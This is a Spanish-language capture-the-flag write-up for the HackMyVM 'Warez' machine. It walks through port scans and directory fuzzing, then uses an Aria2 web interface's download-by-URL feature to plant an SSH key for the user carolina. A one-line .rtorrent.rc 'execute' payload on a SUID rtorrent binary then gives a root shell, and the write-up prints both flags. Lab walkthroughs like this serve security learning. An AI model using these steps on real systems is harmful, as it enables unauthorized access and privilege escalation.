---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Warez HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 03:19 EDT
Nmap scan report for 192.168.5.30
Host is up (0.00038s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 cc:00:63:dd:49:fb:1c:c7:ac:69:63:bc:05:1a:59:cd (RSA)
|   256 9b:19:49:25:eb:9c:60:c5:2b:ec:2a:d4:fd:d1:c2:f4 (ECDSA)
|_  256 41:16:e6:d0:a0:da:22:4f:07:3f:c8:cf:60:2c:02:79 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Aria2 WebUI
6800/tcp open  http    aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
MAC Address: 08:00:27:D5:26:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `80` y el puerto `6800` vamos a ver que contiene cada uno de ellos, si nos vamos al puerto `80` veremos una pagina web normal y corriente sin nada interesante de forma aparente, ahora si nos vamos al puerto `6800` veremos una pantalla en negro como que esta cargando algo pero que no lo llega hacer ya que puede requerir algo mas, vamos a realizar `fuzzing` en los `2` puertos a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.30/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 81758]
/flags                (Status: 403) [Size: 153]
/robots.txt           (Status: 200) [Size: 12]
/result.txt           (Status: 200) [Size: 1585]
[!] Keyboard interrupt detected, terminating.
Progress: 312843 / 882244 (35.46%)
===============================================================
Finished
===============================================================
```

## Escalate user carolina

No encontraremos nada interesante, pero si volvemos a buscar en el puerto `80` veremos esta opcion interesante llamada `Add` -> `By URLs` y veremos un campo que sera el siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-29 093102.png" alt=""><figcaption></figcaption></figure>

Veremos que nos podremos descargar un archivo de forma local en el servidor, desde una `URL` por lo que vamos a probar a establecer un servidor de `python3` y que se nos pase a la carpeta de `carolina` el archivo de `authorized_keys` vamos a realizar lo siguiente.

```shell
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa
```

```shell
cp ~/.ssh/id_rsa .
cat ~/.ssh/id_rsa.pub > authorized_keys
```

Una vez echo esto haremos lo siguiente.

```shell
python3 -m http.server
```

Desde la pagina vamos a rellenar la informacion de esta forma:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-29 094020.png" alt=""><figcaption></figcaption></figure>

Una vez dandole al `Start` veremos que se esta subiendo, en el servidor de `python3` vemos que se descargo el archivo y si probamos a meternos mediante la `id_rsa` de nuestro usuario del `host`.

### SSH

```shell
ssh -i id_rsa carolina@<IP>
```

Con esto estaremos dentro.

```
The authenticity of host '192.168.5.30 (192.168.5.30)' can't be established.
ED25519 key fingerprint is SHA256:6KuYVOialBusL5WnriRRpDGS7zkNND0tbubZE160qDo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.5.30' (ED25519) to the list of known hosts.
Linux warez 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 31 02:43:08 2021 from 192.168.1.51
carolina@warez:~$ whoami
carolina
```

Por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVKeepdownloading
```

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
134030     36 -rwsr-xr-x   1 root     root        35040 Jul 28  2021 /usr/bin/umount
   129908     88 -rwsr-xr-x   1 root     root        88304 Feb  7  2020 /usr/bin/gpasswd
   129909     64 -rwsr-xr-x   1 root     root        63960 Feb  7  2020 /usr/bin/passwd
   133492     44 -rwsr-xr-x   1 root     root        44632 Feb  7  2020 /usr/bin/newgrp
   134028     56 -rwsr-xr-x   1 root     root        55528 Jul 28  2021 /usr/bin/mount
   129906     52 -rwsr-xr-x   1 root     root        52880 Feb  7  2020 /usr/bin/chsh
   147812   2040 -rwsr-sr-x   1 root     root      2087648 Dec 29  2019 /usr/bin/rtorrent
   133658     72 -rwsr-xr-x   1 root     root        71912 Jul 28  2021 /usr/bin/su
   129905     60 -rwsr-xr-x   1 root     root        58416 Feb  7  2020 /usr/bin/chfn
   132259     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   144105    472 -rwsr-xr-x   1 root     root         481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
```

Veremos esta linea de aqui:

```
147812   2040 -rwsr-sr-x   1 root   root  2087648 Dec 29  2019 /usr/bin/rtorrent
```

Vamos a buscar si hay alguna escalada o vulnerabilidad para poder ser `root`.

```shell
echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc /usr/bin/rtorrent
```

Info:

```
# whoami
root
```

Veremos que con esto seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMVKeepsharing
```
